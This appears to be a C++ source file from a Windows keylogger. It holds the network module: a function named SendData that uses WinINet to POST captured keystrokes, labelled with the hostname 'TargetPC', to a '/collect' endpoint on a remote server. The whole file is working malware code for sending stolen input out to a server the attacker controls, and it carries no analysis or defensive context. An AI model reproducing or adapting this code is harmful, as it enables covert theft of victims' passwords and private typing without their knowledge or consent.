#include <windows.h>
#include <wininet.h>
#include "../include/network.h"

using namespace std;

void SendData(string serverIP, int port, string keystrokes) {
    HINTERNET hSession = InternetOpenA("Agent007", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = InternetConnectA(hSession, serverIP.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) return;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/collect", NULL, NULL, NULL, 0, 0);
    
    string headers = "Content-Type: application/x-www-form-urlencoded";
    string body = "hostname=TargetPC&data=" + keystrokes;

    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), body.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}